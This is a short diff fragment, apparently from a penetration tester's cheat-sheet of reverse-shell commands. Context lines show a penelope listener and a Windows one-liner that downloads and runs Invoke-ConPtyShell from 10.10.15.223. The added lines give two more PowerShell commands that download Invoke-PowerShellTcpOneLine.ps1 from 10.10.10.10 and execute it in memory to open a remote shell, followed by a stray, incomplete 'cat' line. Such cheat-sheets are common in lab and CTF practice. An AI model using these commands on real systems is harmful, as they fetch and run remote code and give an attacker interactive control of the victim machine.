@@ -9,7 +9,9 @@ penelope -l 4444
 
 <<windows>>
 IEX(IWR http://10.10.15.223/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.15.223 4443 # or
-
+IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') # Direct execute. or as powershell
+echo IEX(New-object net.webclient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcpOneLine.ps1') | powershell -noprofile - # Direct run, - is for stdin
+cat
 
 
 ```
